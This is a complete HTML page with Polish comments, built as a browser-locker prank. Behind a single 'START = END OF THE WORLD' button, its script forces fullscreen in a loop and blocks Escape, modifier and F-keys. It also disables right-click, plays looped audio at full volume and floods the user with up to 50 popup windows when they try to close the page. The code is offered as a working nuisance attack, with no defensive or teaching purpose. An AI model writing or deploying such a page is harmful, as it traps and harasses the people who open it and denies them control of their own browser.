<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="utf-8">
<title>no to masz przejebane</title>
<style>
  body,html{margin:0;height:100%;background:#000;overflow:hidden}
  #s {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);padding:40px 90px;font-size:70px;background:#900;color:#fff;border:none;border-radius:30px;cursor:pointer;box-shadow:0 0 60px #f00;}
  #s:hover{background:#f00;transform:translate(-50%,-50%) scale(1.1);}
</style>
</head>
<body>

<button id="s">START = KONIEC ŚWIATA</button>

<audio id="a" loop preload="auto">
  <source src="sound.mp3" type="audio/mpeg">
</audio>

<script>
// === ARMAGEDON ===
let apocalypse = false;
let windowsOpened = 0;
const MAX_WINDOWS = 50;

function nuke() {
  if (apocalypse) return;
  apocalypse = true;

  document.getElementById('s').remove();
  document.getElementById('a').volume = 1;
  document.getElementById('a').play();

  // fullscreen w pętli
  const fs = () => document.documentElement.requestFullscreen?.() || document.documentElement.webkitRequestFullscreen?.();
  fs();
  document.onfullscreenchange = () => { if (!document.fullscreenElement) fs(); };

  // blokada klawiszy
  document.onkeydown = e => {
    if (e.key.includes('F') || e.ctrlKey || e.altKey || e.metaKey || e.key==='Escape') {
      e.preventDefault(); e.stopPropagation(); fs();
      return false;
    }
  };
  document.oncontextmenu = () => false;

  // === BOMBARDOWANIE NOWYMI OKNAMI ===
  function spawn() {
    if (windowsOpened >= MAX_WINDOWS) return;
    const win = window.open(location.href, '_blank', 'width=800,height=600');
    if (win) {
      windowsOpened++;
      // nowe okno też od razu ma iść w fullscreen i kontynuować atak
      setTimeout(() => {
        if (win && !win.closed) win.document.documentElement.requestFullscreen?.();
      }, 300);
    }
  }

  // jak ktoś zamknie to okno → spamujemy nowymi co 400 ms
  window.onbeforeunload = () => spawn();
  window.onunload = () => {
    const killer = setInterval(spawn, 400);
    setTimeout(() => clearInterval(killer), 15000); // max 15 sekund spamu
  };

  // na wszelki wypadek co sekundę sprawdzamy, czy żyjemy
  setInterval(fs, 800);
}

document.getElementById('s').onclick = nuke;

// jeśli ktoś wejdzie drugi raz (z nowego okna) – od razu odpala się bez przycisku
if (window.name.includes('hell')) nuke();
</script>
</body>
</html>
